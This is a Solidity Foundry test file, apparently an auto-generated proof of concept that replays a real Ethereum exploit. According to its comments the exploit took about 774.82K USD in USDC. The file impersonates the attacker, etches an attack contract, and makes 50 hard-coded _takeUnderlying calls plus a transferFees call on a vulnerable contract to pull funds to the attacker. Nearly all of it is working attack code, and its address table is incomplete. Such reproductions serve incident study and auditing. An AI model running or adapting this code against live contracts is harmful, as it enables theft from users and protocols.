// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 774.82K USD
// Attacker : 0xf908610e9174c7cd6e9dfd371e238be4511297a1
// Attack Contract : 0x66c6f3b4b4b458e6d764759ecf122484ebef7580
// Vulnerable Contract : 0x66c6f3b4b4b458e6d764759ecf122484ebef7580
// Attack Tx : 0xd191fead1b9a2244f2837560f35d4fc865404914d229bfcb0172d1a7a9895afb
// Block : 25535120
// Chain : Ethereum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 774.82K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_path_entry;
    uint256 constant FORK_BLOCK = 25535119;
    uint256 constant TX_TIMESTAMP = 1784083187;
    uint256 constant TX_BLOCK_NUMBER = 25535120;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 14;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _makeAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        bytes memory entryData =
            abi.encodeWithSelector(bytes4(0xe321fa05), Addresses.A_DAA037_8310, _entryAddresses1(), _entryValues2());
        (bool ok, bytes memory result) = address(attack).call{value: TX_VALUE}(entryData);
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _entryAddresses1() internal pure returns (address[] memory values) {
        address[50] memory observed = [
            Addresses.A_20C76D_0935,
            Addresses.A_E77884_DFB5,
            Addresses.A_71F12A_14B0,
            Addresses.A_B1C120_49D0,
            Addresses.A_2D9244_EA09,
            Addresses.A_0D4C7A_5CB0,
            Addresses.A_B8E4F6_9C69,
            Addresses.A_5D368C_0DC5,
            Addresses.A_AEBE2C_918B,
            Addresses.A_8FE025_011A,
            Addresses.A_A8192F_4EB1,
            Addresses.A_0FE435_FC4E,
            Addresses.A_D0DC07_5DCF,
            Addresses.A_662129_1491,
            Addresses.A_FA006A_B59E,
            Addresses.A_E22289_09A4,
            Addresses.A_8548C1_9864,
            Addresses.A_DA5700_3E23,
            Addresses.A_67BC76_8669,
            Addresses.A_EF76BA_9DB4,
            Addresses.A_7E5F57_8C87,
            Addresses.A_2D59D7_6C11,
            Addresses.A_4EFF35_05FA,
            Addresses.A_FB0CC3_6B69,
            Addresses.A_FFD70E_F957,
            Addresses.A_B3B1A1_57D5,
            Addresses.A_F2AE3D_80FA,
            Addresses.A_29B64F_99CE,
            Addresses.Proxy_C192F7,
            Addresses.A_0524FE_A291,
            Addresses.A_64C967_913F,
            Addresses.A_9CB8CF_F32D,
            Addresses.A_372458_BAA5,
            Addresses.A_1CC3F0_2744,
            Addresses.A_7BB24F_FA0E,
            Addresses.A_F099D0_0FB7,
            Addresses.A_67DA40_C355,
            Addresses.A_0CFA0B_0C3D,
            Addresses.A_8E9B65_7CDF,
            Addresses.A_368C4E_93F1,
            Addresses.A_3AA8AC_CB04,
            Addresses.A_82005D_BCE4,
            Addresses.A_80B315_6E1D,
            Addresses.A_975740_DA10,
            Addresses.A_EBDCA9_2A5C,
            Addresses.A_104D86_E4E9,
            Addresses.A_473C64_2BC6,
            Addresses.A_B152E2_69E5,
            Addresses.A_3A3FE1_BBF1,
            Addresses.A_1DD018_283A
        ];
        values = new address[](observed.length);
        for (uint256 i; i < observed.length; ++i) {
            values[i] = observed[i];
        }
    }

    function _entryValues2() internal pure returns (uint256[] memory values) {
        uint256[50] memory observed = [
            uint256(0x0000000000000000000000000000000000000000000000000000001d40094cfe),
            uint256(0x00000000000000000000000000000000000000000000000000000017515fc3e8),
            uint256(0x00000000000000000000000000000000000000000000000000000013f1bbdf00),
            uint256(0x00000000000000000000000000000000000000000000000000000012362e7aca),
            uint256(0x0000000000000000000000000000000000000000000000000000001213203992),
            uint256(0x0000000000000000000000000000000000000000000000000000000a376e7c40),
            uint256(0x000000000000000000000000000000000000000000000000000000079d5c781a),
            uint256(0x00000000000000000000000000000000000000000000000000000006ca7810b0),
            uint256(0x000000000000000000000000000000000000000000000000000000064c47d4f7),
            uint256(0x0000000000000000000000000000000000000000000000000000000640627ea1),
            uint256(0x000000000000000000000000000000000000000000000000000000048142c780),
            uint256(0x000000000000000000000000000000000000000000000000000000046a19ba55),
            uint256(0x0000000000000000000000000000000000000000000000000000000415c9112d),
            uint256(0x000000000000000000000000000000000000000000000000000000029e5f4e8b),
            uint256(0x00000000000000000000000000000000000000000000000000000002630608fe),
            uint256(0x0000000000000000000000000000000000000000000000000000000217d81846),
            uint256(0x00000000000000000000000000000000000000000000000000000001eae34b3f),
            uint256(0x00000000000000000000000000000000000000000000000000000001945b83aa),
            uint256(0x000000000000000000000000000000000000000000000000000000018d531680),
            uint256(0x00000000000000000000000000000000000000000000000000000001348a7e83),
            uint256(0x00000000000000000000000000000000000000000000000000000001028ed716),
            uint256(0x00000000000000000000000000000000000000000000000000000000e3531586),
            uint256(0x00000000000000000000000000000000000000000000000000000000dd338cfc),
            uint256(0x00000000000000000000000000000000000000000000000000000000b097c1ee),
            uint256(0x00000000000000000000000000000000000000000000000000000000a9a3a68d),
            uint256(0x000000000000000000000000000000000000000000000000000000009041e001),
            uint256(0x0000000000000000000000000000000000000000000000000000000074996bec),
            uint256(0x000000000000000000000000000000000000000000000000000000006b1c31c0),
            uint256(0x0000000000000000000000000000000000000000000000000000000059dce4ca),
            uint256(0x0000000000000000000000000000000000000000000000000000000044ef7b67),
            uint256(0x0000000000000000000000000000000000000000000000000000000043b137c8),
            uint256(0x0000000000000000000000000000000000000000000000000000000038576c32),
            uint256(0x0000000000000000000000000000000000000000000000000000000024d0efdd),
            uint256(0x00000000000000000000000000000000000000000000000000000000241ed53c),
            uint256(0x0000000000000000000000000000000000000000000000000000000021d886ff),
            uint256(0x000000000000000000000000000000000000000000000000000000001d0268f2),
            uint256(0x000000000000000000000000000000000000000000000000000000001c162f82),
            uint256(0x0000000000000000000000000000000000000000000000000000000017e6c6a4),
            uint256(0x0000000000000000000000000000000000000000000000000000000017de6234),
            uint256(0x000000000000000000000000000000000000000000000000000000001623b214),
            uint256(0x0000000000000000000000000000000000000000000000000000000011e1a300),
            uint256(0x0000000000000000000000000000000000000000000000000000000011157026),
            uint256(0x000000000000000000000000000000000000000000000000000000000f2e8a7a),
            uint256(0x000000000000000000000000000000000000000000000000000000000ef2bc8e),
            uint256(0x000000000000000000000000000000000000000000000000000000000d0516d4),
            uint256(0x000000000000000000000000000000000000000000000000000000000cb0e41e),
            uint256(0x000000000000000000000000000000000000000000000000000000000c4b83e5),
            uint256(0x000000000000000000000000000000000000000000000000000000000bebc200),
            uint256(0x000000000000000000000000000000000000000000000000000000000bd70005),
            uint256(0x0000000000000000000000000000000000000000000000000000000009956dc3)
        ];
        values = new uint256[](observed.length);
        for (uint256 i; i < observed.length; ++i) {
            values[i] = observed[i];
        }
    }

    function _makeAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(0);
    }

    function _etchAttackRuntime() internal {
        // Exact-address fallback for observed CREATE/CREATE2 and callback surfaces.
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC, "USDC", 774943379409);
    }
}

contract OurAttack {
    function attack() public payable {
        _settleTokenFlows();
    }

    function _getBalance() internal {
        _getBalance3();
    }

    function _getBalance2() internal {
        _getBalance4();
    }

    function _handleCallback() internal {
        _replayFlow();
    }

    function _getBalance3() internal {}

    function _getBalance4() internal {}

    function _settleTokenFlows() internal {
        _settleUsd0A();
        _settleUsd0B();
    }

    function _settleUsd0A() internal {
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_20C76D_0935, 125628402942);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_E77884_DFB5, 100149478376);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_71F12A_14B0, 85660000000);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_B1C120_49D0, 78218427082);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_2D9244_EA09, 77630290322);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_0D4C7A_5CB0, 43879660608);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_B8E4F6_9C69, 32704854042);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_5D368C_0DC5, 29166670000);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_AEBE2C_918B, 27049579767);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_8FE025_011A, 26850000545);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_A8192F_4EB1, 19348506496);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_0FE435_FC4E, 18959940181);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_D0DC07_5DCF, 17545367853);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_662129_1491, 11246980747);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_FA006A_B59E, 10251274494);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_E22289_09A4, 8989972550);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_8548C1_9864, 8235731775);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_DA5700_3E23, 6783992746);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_67BC76_8669, 6666000000);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_EF76BA_9DB4, 5176458883);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_7E5F57_8C87, 4337882902);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_2D59D7_6C11, 3813873030);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_4EFF35_05FA, 3711143164);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_FB0CC3_6B69, 2962735598);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_FFD70E_F957, 2846074509);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_B3B1A1_57D5, 2420236289);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_F2AE3D_80FA, 1956211692);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_29B64F_99CE, 1797009856);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.Proxy_C192F7, 1507648714);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_0524FE_A291, 1156545383);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_64C967_913F, 1135687624);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_9CB8CF_F32D, 945253426);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_372458_BAA5, 617672669);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_1CC3F0_2744, 606000444);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_7BB24F_FA0E, 567838463);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_F099D0_0FB7, 486697202);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_67DA40_C355, 471216002);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_0CFA0B_0C3D, 401000100);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_8E9B65_7CDF, 400450100);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_368C4E_93F1, 371438100);
    }

    function _settleUsd0B() internal {
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_3AA8AC_CB04, 300000000);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_82005D_BCE4, 286617638);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_80B315_6E1D, 254708346);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_975740_DA10, 250789006);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_EBDCA9_2A5C, 218437332);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_104D86_E4E9, 212919326);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_473C64_2BC6, 206275557);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_B152E2_69E5, 200000000);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_3A3FE1_BBF1, 198639621);
        ITakeUnderlyingLike(Addresses.A_DAA037_8310)._takeUnderlying(Addresses.A_1DD018_283A, 160787907);
        ITransferFeesLike(Addresses.A_DAA037_8310).transferFees();
    }

    function _replayFlow() internal {}

    receive() external payable {}

    function _beforeCTokenBalanceChange() external payable {
        uint256 dispatchOrdinal = _nextDispatch(0x5e0a5ba6);
        if (dispatchOrdinal == 0) {
            if (!_replayActive[REPLAY_CALLBACK_1]) {
                _replayActive[REPLAY_CALLBACK_1] = true;
                _getBalance();
                _replayActive[REPLAY_CALLBACK_1] = false;
            }
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 1) {
            _getBalance3();
            return;
        }
        if (!_replayActive[REPLAY_CALLBACK_1]) {
            _replayActive[REPLAY_CALLBACK_1] = true;
            _getBalance();
            _replayActive[REPLAY_CALLBACK_1] = false;
        }
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function _afterCTokenBalanceChange(uint256 amount) external payable {
        uint256 dispatchOrdinal = _nextDispatch(0xb656c31c);
        if (dispatchOrdinal == 0) {
            if (!_replayActive[REPLAY_CALLBACK_2]) {
                _replayActive[REPLAY_CALLBACK_2] = true;
                _getBalance2();
                _replayActive[REPLAY_CALLBACK_2] = false;
            }
            bytes memory ret = hex"";
            assembly { return(add(ret, 32), mload(ret)) }
        }
        if (dispatchOrdinal == 1) {
            _getBalance4();
            return;
        }
        if (!_replayActive[REPLAY_CALLBACK_2]) {
            _replayActive[REPLAY_CALLBACK_2] = true;
            _getBalance2();
            _replayActive[REPLAY_CALLBACK_2] = false;
        }
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    function feesOwner() external payable {
        bytes memory ret = hex"000000000000000000000000f908610e9174c7cd6e9dfd371e238be4511297a1";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0xe321fa05) {
            attack();
            return;
        }
    }

    bytes32 private constant REPLAY_CALLBACK_1 = keccak256("poc.replay.REPLAY_CALLBACK_1");
    bytes32 private constant REPLAY_CALLBACK_2 = keccak256("poc.replay.REPLAY_CALLBACK_2");
    bytes32 private constant REPLAY_CALLBACK_4 = keccak256("poc.replay.REPLAY_CALLBACK_4");
    mapping(bytes32 => bool) private _replayActive;

    mapping(bytes4 => uint256) private _dispatchCursor;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextDispatch(bytes4 selector) internal returns (uint256 ordinal) {
        ordinal = _dispatchCursor[selector];
        _dispatchCursor[selector] = ordinal + 1;
    }

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _recordBalancerPre(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerPre(address[] memory tokens) external {
        _recordBalancerPre(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_0524FE_A291 = 0x0524Fe637b77A6F5f0b3a024f7fD9Fe1E688A291; // Addresses.A_0524FE_A291 = 0x0524fe637b77a6f5f0b3a024f7fd9fe1e688a291 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_0CFA0B_0C3D = 0x0CfA0B89383fe30602240EFa1a2e1380f9090c3d; // Addresses.A_0CFA0B_0C3D = 0x0cfa0b89383fe30602240efa1a2e1380f9090c3d label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_0D4C7A_5CB0 = 0x0D4C7Abf6A1FBcBF4DbE7B98D4e1af26D5165cB0; // Addresses.A_0D4C7A_5CB0 = 0x0d4c7abf6a1fbcbf4dbe7b98d4e1af26d5165cb0 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_0FE435_FC4E = 0x0fe43549413276E5b2dA467f979FEe18f830fC4E; // Addresses.A_0FE435_FC4E = 0x0fe43549413276e5b2da467f979fee18f830fc4e label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_104D86_E4E9 = 0x104D86705c46e9422B803AF522b43809f1C8e4e9; // Addresses.A_104D86_E4E9 = 0x104d86705c46e9422b803af522b43809f1c8e4e9 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_1CC3F0_2744 = 0x1cc3f09D7C971562F9d0Afbe4D0ee152b0fd2744; // Addresses.A_1CC3F0_2744 = 0x1cc3f09d7c971562f9d0afbe4d0ee152b0fd2744 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_1DD018_283A = 0x1Dd01835E0Eb26ABe597e2e69FfAC1A6cd00283A; // Addresses.A_1DD018_283A = 0x1dd01835e0eb26abe597e2e69ffac1a6cd00283a label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_20C76D_0935 = 0x20C76D4203BF7490615804FE4fe9B132EE3E0935; // Addresses.A_20C76D_0935 = 0x20c76d4203bf7490615804fe4fe9b132ee3e0935 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_29B64F_99CE = 0x29b64F5D95a71B79874c4B5192c371BEa4B899cE; // Addresses.A_29B64F_99CE = 0x29b64f5d95a71b79874c4b5192c371bea4b899ce label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_2D59D7_6C11 = 0x2D59d742cCe3a02E6A13958019F1A73EFDf66C11; // Addresses.A_2D59D7_6C11 = 0x2d59d742cce3a02e6a13958019f1a73efdf66c11 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_2D9244_EA09 = 0x2d92441144E294d8eCEd55838d7665D04d64eA09; // Addresses.A_2D9244_EA09 = 0x2d92441144e294d8eced55838d7665d04d64ea09 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_368C4E_93F1 = 0x368C4E8933cf3577CcC394b4e05b4E03691493f1; // Addresses.A_368C4E_93F1 = 0x368c4e8933cf3577ccc394b4e05b4e03691493f1 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_372458_BAA5 = 0x3724583Ad51c8f7c4aB168dDcD185681Db07Baa5; // Addresses.A_372458_BAA5 = 0x3724583ad51c8f7c4ab168ddcd185681db07baa5 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_3A3FE1_BBF1 = 0x3A3fe1cB66728282116802306093E327477CBbf1; // Addresses.A_3A3FE1_BBF1 = 0x3a3fe1cb66728282116802306093e327477cbbf1 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_3AA8AC_CB04 = 0x3aA8Ac0E6C1Fb9CBb733565De16cdC5a676bCb04; // Addresses.A_3AA8AC_CB04 = 0x3aa8ac0e6c1fb9cbb733565de16cdc5a676bcb04 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_473C64_2BC6 = 0x473C6494180ad9Cd726f8a7a51cF8e88Bbf72bc6; // Addresses.A_473C64_2BC6 = 0x473c6494180ad9cd726f8a7a51cf8e88bbf72bc6 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_4EFF35_05FA = 0x4efF3562075C5D2d9cb608139eC2fE86907005Fa; // Addresses.A_4EFF35_05FA = 0x4eff3562075c5d2d9cb608139ec2fe86907005fa label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_5D368C_0DC5 = 0x5d368c382Ae92FBA52233B95C633C96FE49D0Dc5; // Addresses.A_5D368C_0DC5 = 0x5d368c382ae92fba52233b95c633c96fe49d0dc5 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_64C967_913F = 0x64c9677Ea9ad52263A319faaA226AA436541913F; // Addresses.A_64C967_913F = 0x64c9677ea9ad52263a319faaa226aa436541913f label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_662129_1491 = 0x6621295A7fAdD3AB78aE6915502bD50fDd5A1491; // Addresses.A_662129_1491 = 0x6621295a7fadd3ab78ae6915502bd50fdd5a1491 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant attack_path_entry = 0x66c6f3b4B4b458e6d764759Ecf122484ebEf7580; // Addresses.attack_path_entry = 0x66c6f3b4b4b458e6d764759ecf122484ebef7580 label=attack_path_entry roles=attack_path_entry_contract|attacker_callback_contract|attacker_contract|code_contract|contract|delegate_storage_context|delegate_storage_context_contract|localized_contract|observed_address|poc_reconstruction_surface|sender|storage_contract source=localize.localized_call_graph confidence=high
    address internal constant A_67BC76_8669 = 0x67BC76E8Fd78CC59594C9F43C643eA7CAfA48669; // Addresses.A_67BC76_8669 = 0x67bc76e8fd78cc59594c9f43c643ea7cafa48669 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_67DA40_C355 = 0x67DA405C030d107d18510B5Ad708A34218C9c355; // Addresses.A_67DA40_C355 = 0x67da405c030d107d18510b5ad708a34218c9c355 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_71F12A_14B0 = 0x71F12a5b0E60d2Ff8A87FD34E7dcff3c10c914b0; // Addresses.A_71F12A_14B0 = 0x71f12a5b0e60d2ff8a87fd34e7dcff3c10c914b0 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_7BB24F_FA0E = 0x7BB24F9ae8843590FABF42e049577e2ba68AFa0E; // Addresses.A_7BB24F_FA0E = 0x7bb24f9ae8843590fabf42e049577e2ba68afa0e label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_7E5F57_8C87 = 0x7e5F578d0E4c43aE5C06A19BFB43A539A8908C87; // Addresses.A_7E5F57_8C87 = 0x7e5f578d0e4c43ae5c06a19bfb43a539a8908c87 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_80B315_6E1D = 0x80B3153F39Aeec1EF68Adc038913698e103E6e1d; // Addresses.A_80B315_6E1D = 0x80b3153f39aeec1ef68adc038913698e103e6e1d label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_82005D_BCE4 = 0x82005D65AEcb10D711399cdDf8F39c553881bCe4; // Addresses.A_82005D_BCE4 = 0x82005d65aecb10d711399cddf8f39c553881bce4 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_8548C1_9864 = 0x8548c1709184f052D2917f69df09676EAF759864; // Addresses.A_8548C1_9864 = 0x8548c1709184f052d2917f69df09676eaf759864 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_8E9B65_7CDF = 0x8e9B650B79bd28f324f5B26D6dDBA594eb237cDf; // Addresses.A_8E9B65_7CDF = 0x8e9b650b79bd28f324f5b26d6ddba594eb237cdf label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_8FE025_011A = 0x8FE02545E479Aa8bA77D84E51b1D9Ca17B88011A; // Addresses.A_8FE025_011A = 0x8fe02545e479aa8ba77d84e51b1d9ca17b88011a label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_975740_DA10 = 0x9757400188F2F54b83ac4dC290aB89dde526da10; // Addresses.A_975740_DA10 = 0x9757400188f2f54b83ac4dc290ab89dde526da10 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_9CB8CF_F32D = 0x9cB8CF9Cc2C181cBfAd055838B3a7efC6755f32D; // Addresses.A_9CB8CF_F32D = 0x9cb8cf9cc2c181cbfad055838b3a7efc6755f32d label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant A_A8192F_4EB1 = 0xA8192F71f0Ec42Bf8cA501E80475E2287Ee54EB1; // Addresses.A_A8192F_4EB1 = 0xa8192f71f0ec42bf8ca501e80475e2287ee54eb1 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_AEBE2C_918B = 0xAEbe2c167392E4b0d3e150ca80204eB327Db918b; // Addresses.A_AEBE2C_918B = 0xaebe2c167392e4b0d3e150ca80204eb327db918b label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_B152E2_69E5 = 0xB152e2351c2209Ef82cB475f8D7D8693509C69e5; // Addresses.A_B152E2_69E5 = 0xb152e2351c2209ef82cb475f8d7d8693509c69e5 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_B1C120_49D0 = 0xB1C120957a5b5C45A15fd6e5E17f5A2B70bF49d0; // Addresses.A_B1C120_49D0 = 0xb1c120957a5b5c45a15fd6e5e17f5a2b70bf49d0 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_B3B1A1_57D5 = 0xB3b1A1193a0B7B48B46eFC3c86B614B152c257D5; // Addresses.A_B3B1A1_57D5 = 0xb3b1a1193a0b7b48b46efc3c86b614b152c257d5 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_B8E4F6_9C69 = 0xB8e4f6DEDFa4D4063D465536Bcb5926744319C69; // Addresses.A_B8E4F6_9C69 = 0xb8e4f6dedfa4d4063d465536bcb5926744319c69 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant Proxy_C192F7 = 0xc192F75bcb64D2E4f7e444A8E6fe8c3729728086; // Addresses.Proxy_C192F7 = 0xc192f75bcb64d2e4f7e444a8e6fe8c3729728086 label=Proxy roles=observed_address|sender source=etherscan_v2 confidence=high
    address internal constant A_D0DC07_5DCF = 0xd0dC07B98769f23A7BDbef15A35Faa256CB65dCF; // Addresses.A_D0DC07_5DCF = 0xd0dc07b98769f23a7bdbef15a35faa256cb65dcf label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_DA5700_3E23 = 0xDA57009d183fF7e2a4DA0f552a801FFd440a3e23; // Addresses.A_DA5700_3E23 = 0xda57009d183ff7e2a4da0f552a801ffd440a3e23 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_DAA037_8310 = 0xDAA037F99d168b552c0c61B7Fb64cF7819D78310; // Addresses.A_DAA037_8310 = 0xdaa037f99d168b552c0c61b7fb64cf7819d78310 label=unresolved roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_E22289_09A4 = 0xe22289fC90d684b704c89D2ef0416bE2dcb509a4; // Addresses.A_E22289_09A4 = 0xe22289fc90d684b704c89d2ef0416be2dcb509a4 label=unresolved roles=observed_address|sender source=unresolved confidence=low
    address internal constant A_E77884_DFB5 = 0xe77884CDdF148DD5f0e9191B33D8dBAdDB16DFB5; // Addresses.A_E77884_DFB5 = 0xe77884cddf148dd5f0e9191b33d8dbaddb16dfb5 label=unresolved roles=observed_address|sender source=unresolved confidence=low
